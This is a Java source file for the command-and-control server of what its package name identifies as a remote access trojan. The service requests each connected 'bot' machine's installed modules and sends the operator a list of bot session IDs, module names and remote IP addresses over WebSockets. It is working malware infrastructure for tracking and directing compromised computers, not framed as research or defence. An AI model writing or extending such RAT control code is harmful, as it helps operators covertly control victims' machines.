package devs.alex.sah.rat.c2server.services.impl;

import devs.alex.sah.rat.c2server.configuration.MessagesConfiguration;
import devs.alex.sah.rat.c2server.models.AssociativePair;
import devs.alex.sah.rat.c2server.models.Message;
import devs.alex.sah.rat.c2server.services.MessagesBuilder;
import devs.alex.sah.rat.c2server.services.ServerEndpoint;
import devs.alex.sah.rat.c2server.services.WebSocketSessionService;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Service;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

@Slf4j
@Service
public class ServerEndpointImpl implements ServerEndpoint {

    private final WebSocketSessionService botWSSessionService;
    private final WebSocketSessionService userWSSessionService;
    private final MessagesBuilder messagesBuilder;
    private final MessagesConfiguration mConfig;

    public ServerEndpointImpl(@Qualifier("botWebSocketSessionService") WebSocketSessionService botWSSessionService,
                              @Qualifier("userWebSocketSessionService") WebSocketSessionService userWSSessionService, MessagesBuilder messagesBuilder, MessagesConfiguration mConfig) {
        this.botWSSessionService = botWSSessionService;
        this.userWSSessionService = userWSSessionService;
        this.messagesBuilder = messagesBuilder;
        this.mConfig = mConfig;
    }

    @Override
    public void getModules(WebSocketSession botSession){
        String requestId =  UUID.randomUUID().toString();
        String envelope = messagesBuilder.generateServer2botEnvelope(
                botSession.getId(), "ModulesManager", requestId);

        botSession.getAttributes().put(requestId, new AssociativePair("sErvEr", requestId, "mm"));
        try {
            botSession.sendMessage(new TextMessage(envelope + "getModules"));
        } catch (IOException e) {
            log.error("Fault send message. Message envelope: {}. Error: {}", envelope, e.getMessage());
        }
    }

    @Override
    public void executeCommand(Sender sender, WebSocketSession session, Message<?> message) {

        if (message.getPayload() instanceof String) {
            String payload = ((Message<String>) message).getPayload();

            if(payload.startsWith("botModules")){
                String modules = " [" + payload.substring(11) + " ]";
                session.getAttributes().put("modules", modules);
            } else{
                Map<String, WebSocketSession> botSessions = botWSSessionService.getSessions(new HashMap<>());
                StringBuilder sessionsIdList = new StringBuilder();
                for(Map.Entry<String, WebSocketSession> ws : botSessions.entrySet()) {
                    sessionsIdList.append(ws.getKey())
                            .append(ws.getValue().getAttributes().get("modules"))
                            .append("[")
                            .append(ws.getValue().getRemoteAddress())
                            .append(" ]")
                            .append("\n");
                }
                String envelope = messagesBuilder.generateServer2UserEnvelope(
                        session.getId(), message.getTargetModule(), message.getRequestID());
                try {
                    session.sendMessage(new TextMessage(envelope + sessionsIdList.toString()));
                } catch (IOException e) {
                    log.error("Fault send message. Message envelope: {}. Error: {}", envelope, e.getMessage());
                }
            }

        }
    }
}
